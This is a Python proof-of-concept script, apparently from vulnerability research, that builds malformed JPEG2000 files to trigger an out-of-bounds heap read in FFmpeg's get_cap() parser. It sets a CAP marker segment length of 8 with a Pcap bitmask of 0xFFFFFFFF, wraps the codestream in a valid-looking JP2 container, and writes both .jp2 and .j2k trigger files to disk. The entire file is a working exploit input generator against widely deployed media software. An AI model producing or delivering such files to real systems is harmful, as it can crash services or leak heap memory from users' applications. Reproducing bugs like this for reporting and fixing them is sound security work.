#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Heap Read in get_cap() via Untrusted Pcap Bitmask
CVE: N/A
File: libavcodec/jpeg2000dec.c, function get_cap(), lines 455-464

Trigger: CAP marker with len=8 (only 6 bytes of data: 4 Pcap + 2 Ccap) but
Pcap=0xFFFFFFFF (all 32 bits set). The loop will attempt to read 32 * 2 = 64
bytes of Ccap values but only 2 bytes are available, causing OOB heap read.

NOTE: CAP marker MUST come after SIZ per FFmpeg parser (s->ncomponents check).
"""

import struct
import os

def make_box(box_type, data):
    """Create a JP2 box: 4-byte length + 4-byte type + data."""
    length = 8 + len(data)
    return struct.pack('>I', length) + box_type + data

def build_j2k_codestream():
    """Build a minimal J2K codestream with a malicious CAP marker.

    CAP must come AFTER SIZ per the JPEG2000 spec and FFmpeg's parser check.
    """
    codestream = b''

    # SOC marker: Start of Codestream
    codestream += b'\xff\x4f'

    # SIZ marker: 0xFF51 - Image and tile size (minimal valid SIZ, must come first)
    # Segment length = 2 (Lsiz) + 2 (Rsiz) + 8*4 (dims) + 2 (Csiz) + 3*1 (1 component)
    # = 2 + 2 + 32 + 2 + 3 = 41 bytes total for segment (including Lsiz field)
    siz_marker = b'\xff\x51'
    siz_data = struct.pack('>H', 41)    # Lsiz (total segment length including Lsiz)
    siz_data += struct.pack('>H', 0)    # Rsiz (0=baseline)
    siz_data += struct.pack('>I', 1)    # Xsiz
    siz_data += struct.pack('>I', 1)    # Ysiz
    siz_data += struct.pack('>I', 0)    # XOsiz
    siz_data += struct.pack('>I', 0)    # YOsiz
    siz_data += struct.pack('>I', 1)    # XTsiz
    siz_data += struct.pack('>I', 1)    # YTsiz
    siz_data += struct.pack('>I', 0)    # XTOsiz
    siz_data += struct.pack('>I', 0)    # YTOsiz
    siz_data += struct.pack('>H', 1)    # Csiz = 1
    siz_data += struct.pack('B', 7)     # Ssiz[0]
    siz_data += struct.pack('B', 1)     # XRsiz[0]
    siz_data += struct.pack('B', 1)     # YRsiz[0]
    codestream += siz_marker + siz_data

    # CAP marker: 0xFF50 -- MUST come after SIZ
    # Lsiz = 8 (includes the 2-byte Lsiz field -> 6 bytes of data)
    # Pcap = 0xFFFFFFFF (all 32 bits set -> loop reads 32 Ccap words = 64 bytes)
    # Only 2 bytes available after reading Pcap -> OOB read on 2nd iteration
    cap_marker = b'\xff\x50'
    cap_len = struct.pack('>H', 8)            # Lsiz = 8
    cap_pcap = struct.pack('>I', 0xFFFFFFFF)  # all 32 bits set
    cap_ccap = struct.pack('>H', 0x0000)      # only 1 Ccap word fits
    codestream += cap_marker + cap_len + cap_pcap + cap_ccap

    # EOC: End of Codestream
    codestream += b'\xff\xd9'

    return codestream

def build_jp2():
    """Build a complete JP2 container file."""
    # JP2 Signature box
    sig_box = make_box(b'jP  ', b'\x0d\x0a\x87\x0a')

    # File Type box
    ftyp_data = b'jp2 '          # brand
    ftyp_data += struct.pack('>I', 0)  # minor version
    ftyp_data += b'jp2 '         # compatibility list
    ftyp_box = make_box(b'ftyp', ftyp_data)

    # Image Header box (ihdr) - 14 bytes of data
    ihdr_data = struct.pack('>I', 1)   # height
    ihdr_data += struct.pack('>I', 1)  # width
    ihdr_data += struct.pack('>H', 1)  # components
    ihdr_data += struct.pack('B', 7)   # bpc
    ihdr_data += struct.pack('B', 7)   # compression type
    ihdr_data += struct.pack('B', 0)   # unk_colorspace
    ihdr_data += struct.pack('B', 0)   # ipr
    ihdr_box = make_box(b'ihdr', ihdr_data)

    # Colour Specification box (colr) - 7 bytes of data
    colr_data = struct.pack('B', 1)    # meth (enumerated colorspace)
    colr_data += struct.pack('B', 0)   # prec
    colr_data += struct.pack('B', 0)   # approx
    colr_data += struct.pack('>I', 16) # enumCS = sRGB
    colr_box = make_box(b'colr', colr_data)

    # JP2 Header superbox (jp2h)
    jp2h_data = ihdr_box + colr_box
    jp2h_box = make_box(b'jp2h', jp2h_data)

    # Contiguous Codestream box (jp2c)
    codestream = build_j2k_codestream()
    jp2c_box = make_box(b'jp2c', codestream)

    return sig_box + ftyp_box + jp2h_box + jp2c_box

def main():
    outfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.jp2')
    jp2_data = build_jp2()
    with open(outfile, 'wb') as f:
        f.write(jp2_data)
    print(f"Generated {outfile} ({len(jp2_data)} bytes)")

    # Also generate a raw J2K version for direct testing
    j2k_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.j2k')
    codestream = build_j2k_codestream()
    with open(j2k_file, 'wb') as f:
        f.write(codestream)
    print(f"Generated {j2k_file} ({len(codestream)} bytes)")

if __name__ == '__main__':
    main()
